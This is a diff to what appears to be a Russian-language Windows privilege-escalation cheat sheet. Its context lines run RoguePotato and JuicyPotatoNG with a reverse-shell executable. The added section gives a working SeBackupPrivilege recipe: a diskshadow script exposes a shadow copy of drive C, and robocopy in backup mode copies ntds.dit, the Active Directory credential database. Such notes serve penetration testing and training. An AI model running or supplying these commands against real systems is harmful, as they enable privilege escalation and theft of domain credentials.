@@ -237,7 +237,28 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     https://github.com/antonioCoco/JuicyPotatoNG/releases
 
     .\jp.exe -t * -p c:\programdata\cmd.bat
+
+# SeBackupPrivilege
+
+1        делаем файл diskshadow.txt
+
+    set verbose on
+    set metadata C:\windows\Temp\meta.cab
+    set context clientaccessible
+    set context persistent
+    begin backup
+    add volume c: alias cdrive
+    create
+    expose %cdrive% E:
+    end backup
+
+2        переврдим в дос формат 
     
+    unix2dos  diskshadow.txt
+3    diskshadow /s diskshadow.txt
+     robocopy /b e:\windows\ntds . ntds.dit
+
+
 # Подсказки для виндовс
 
 # https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec
